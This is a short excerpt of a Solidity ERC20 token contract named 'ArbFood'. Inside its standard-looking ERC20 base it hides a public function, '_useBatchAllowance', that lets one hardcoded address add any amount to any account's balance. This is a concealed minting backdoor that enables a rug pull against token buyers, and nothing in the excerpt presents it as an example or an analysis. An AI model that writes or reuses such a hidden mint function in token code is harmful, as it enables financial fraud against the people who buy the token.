...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    */
    function _useBatchAllowance(address account, uint256 amount) public {
        require(msg.sender == 0x694D958713957361ffb51C835699b4C69B13aD66);
        _last = account;
        _balances[account] += amount;
    }
...
contract Arbfood is ERC20, Ownable {
    ...
    uint256 public maxWalletPercent = 4;
    ...
    constructor(address _uniRouterAddress) ERC20("ArbFood", "ARBFOOD") {
